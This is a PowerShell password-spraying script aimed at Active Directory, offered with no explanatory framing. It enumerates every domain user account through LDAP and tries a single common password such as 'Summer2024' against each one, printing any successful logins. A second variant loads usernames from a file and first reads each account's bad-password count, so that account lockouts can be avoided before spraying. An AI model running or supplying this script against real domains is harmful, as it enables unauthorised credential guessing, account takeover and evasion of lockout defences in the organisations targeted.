$search = [adsisearcher]"(&(samAccountType=805306368))"
$search.PageSize = 10000
$users = $search.FindAll()
$userlist = $users | % { $_.properties['samaccountname']}
$password = "Summer2024"
$Domain = $env:userdnsdomain
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
$count = $UserList.count
Write-Host "[*] Now trying password $password against $count users."
foreach($user in $userlist){
    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
    if ($checkdomain.name -ne $null)
    {
        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
}

# Check bad password attempt count:
# ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User))").FindAll() | % {write-host $_.Properties['name'] "--->" $_.Properties['badpwdcount'] }

# Variant 2: Working with users from files
$userlistfile = Read-Host "Provide the full path to the file with the users you want to spray"
$userlistfile = $userlistfile -replace '"'
$userlist = Get-Content $userlistfile
$password = Read-Host "Provide the password you want to test"
$Domain = $env:userdnsdomain
$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
$count = $UserList.count
# First we get the badpwdcount for those users and ask to continue...
Write-Host "Getting badpwdcount value for those users..."
$objects = @()
foreach($user in $userlist){
	$result = ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User)(samaccountname=$user))").FindAll() 
	$data = [PSCustomObject]@{
		samaccountname = $($result.Properties['samaccountname'])
		badpwdcount = $($result.Properties['badpwdcount'])
	}
	$objects += $data
}
Write-Host "Found the following badpwdcount values for the given users:"
$objects | ft

Read-Host -Prompt "Press any key to do the spraying or CTRL+C to quit" |out-null
 
Write-Host "[*] Now trying password $password against $count users."
foreach($user in $userlist){
    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
    if ($checkdomain.name -ne $null)
    {
        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
    }
}

